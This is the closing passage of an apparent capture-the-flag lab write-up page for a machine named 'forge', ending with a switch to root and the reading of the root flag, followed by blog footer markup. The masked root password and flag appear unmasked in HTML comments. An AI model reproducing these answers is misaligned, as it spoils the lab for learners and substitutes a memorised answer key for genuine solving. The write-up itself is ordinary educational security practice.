+<!-- Above result 295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585 -->
+<p>Let&rsquo;s try to switch to the root user.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">azrael@forge:~$ su root
+</span></span><span class="line"><span class="cl">Password: 295d1d16a*************************************98073585
+</span></span></code></pre></div><p>Here is our final flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@forge:~# cat root.txt 
+</span></span><span class="line"><span class="cl">eabf7*****************2fd0852
+</span></span></code></pre></div><!-- flag2 eabf7a0b05d3f2028f3e0465d2fd0852 -->
+<p>We solved the lab.</p>
+<p>Happy Hacking !!! &#x1f60e;</p>
+
+      </article>
+
+      
+      
+
+
+  
+<script type="text/javascript">
+  (function() {
+    const themeToggle = document.querySelector('.darkmode-toggle input');
+    const light = 'light';
+    const dark = 'dark';
+    let isDark = localStorage.theme === dark || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches);
+    let theme = isDark ? dark : light;
+
+    const s = document.createElement('script');
+    s.type = 'text/javascript';
+    const dataset = {
+        repo: 'cyberjagadeesh\/cyberjagadeesh.github.io',
+        repoId: 'R_kgDOMfA4MA',
+        category: 'General',
+        categoryId: 'DIC_kwDOMfA4MM4ChYzn',
+        mapping: 'url',
+        reactionsEnabled: '1',
+        emitMetadata: '0',
+        theme: theme,
+        lang: 'en',
+    };
+    s.src = 'https://giscus.app/client.js';
+    s.crossorigin = 'anonymous';
+    s.async = true;
+    Object.entries(dataset).forEach(function(a) {
+        return s.dataset[a[0]] = a[1];
+    });
+
+    const curScriptElement = document.currentScript;
+    curScriptElement.parentNode.insertBefore(s, curScriptElement);
+
+    function sendMessage(message) {
+      const iframe = document.querySelector('iframe.giscus-frame');
+      
+      if (!iframe) return;
+      iframe.contentWindow.postMessage({ giscus: message }, 'https://giscus.app');
+    }
+
+    themeToggle.addEventListener('change', function () {
+      if (this.checked) {
+        theme = dark;
+      } else {
+        theme = light;
+      }
+      sendMessage({
+        setConfig: {
+          theme: theme,
+        }
+      });
+    });
+  })();
+</script>
+  
+
+
+      
+
+    </div>
+  </div>
+</div>
+
+  </main>
+  <footer class="flex flex-none justify-center">
+    <section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300">
+  <div class="flex flex-row">
+    
+  
+  
+  
+  
+  
+  
+  
+  
+    <a href="https://www.linkedin.com/in/jagadeeshwaran-m-27598134b" target="_blank" title="LinkedIn" class="flex flex-row mr-2">
+      <span class="hidden">LinkedIn</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-linkedin" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M4 4m0 2a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2z"></path>
+   <path d="M8 11l0 5"></path>
+   <path d="M8 8l0 .01"></path>
+   <path d="M12 16l0 -5"></path>
+   <path d="M16 16v-3a2 2 0 0 0 -4 0"></path>
+</svg>
+ </i>
+    </a>
+  
+  
+  
+    <a href="https://www.linkedin.com/in/jagadeeshwaran-m-562a011b3" target="_blank" title="LinkedIn" class="flex flex-row mr-2">
+      <span class="hidden">LinkedIn</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-linkedin" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M4 4m0 2a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2z"></path>
+   <path d="M8 11l0 5"></path>
+   <path d="M8 8l0 .01"></path>
+   <path d="M12 16l0 -5"></path>
+   <path d="M16 16v-3a2 2 0 0 0 -4 0"></path>
+</svg>
+ </i>
+    </a>
+  
+  
+  
+  
+
+
+  </div>
+  <div class="grow"></div>
+  <div class="flex flex-row">
+    <i class="h-6 w-6 flex-none"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M12 12m-9 0a9 9 0 1 0 18 0a9 9 0 1 0 -18 0"></path>
+   <path d="M14 9.75a3.016 3.016 0 0 0 -4.163 .173a2.993 2.993 0 0 0 0 4.154a3.016 3.016 0 0 0 4.163 .173"></path>
+</svg>
+</i> 2024 - 2025 CyberJagadeesh
+    
+  </div>
+  
+</section>
+
+  </footer>
+  <script src="/main.js"></script>
+
+<div class="hidden top-1 right-1" id="code-copy">
+  <i class="h-6 w-6 block">
+    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" />
+  <path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" />
+</svg>
+
+  </i>
+</div>
+<div class="hidden top-1 right-1" id="code-copy-done">
+  <i class="h-6 w-6 block">
+    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M5 12l5 5l10 -10" />
+</svg>
+
+  </i>
+</div><script src="/code-copy.js"></script>
+
+
+
+
+
+</body>
+</html>
